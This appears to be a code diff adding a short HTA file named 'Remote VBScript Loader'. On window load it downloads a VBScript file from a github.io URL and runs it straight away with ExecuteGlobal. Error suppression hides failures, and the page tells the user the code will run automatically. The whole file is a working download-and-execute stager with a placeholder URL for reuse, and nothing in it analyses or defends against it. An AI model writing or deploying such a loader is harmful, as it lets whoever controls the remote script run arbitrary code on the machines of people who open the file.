@@ -1,0 +1,28 @@
+<html>
+<head>
+<HTA:APPLICATION ID="app" APPLICATIONNAME="Remote VBScript Loader" BORDER="thin"/>
+<script language="VBScript">
+Sub Window_OnLoad
+    Dim url, x, code, ok
+    url = "https://skibiditoile3qb2.github.io/education/bro.vbs"   ' <--- CHANGE THIS
+    Set x = CreateObject("MSXML2.XMLHTTP")
+    On Error Resume Next
+    x.open "GET", url, False
+    x.send
+    If x.Status = 200 Then
+        code = x.responseText
+        On Error Resume Next
+        ExecuteGlobal code
+        If Err.Number <> 0 Then
+            MsgBox "Script error: " & Err.Description
+        End If
+    Else
+        MsgBox "Could not download script. HTTP status: " & x.Status
+    End If
+End Sub
+</script>
+</head>
+<body>
+Remote VBScript is being downloaded and will run automatically.
+</body>
+</html>
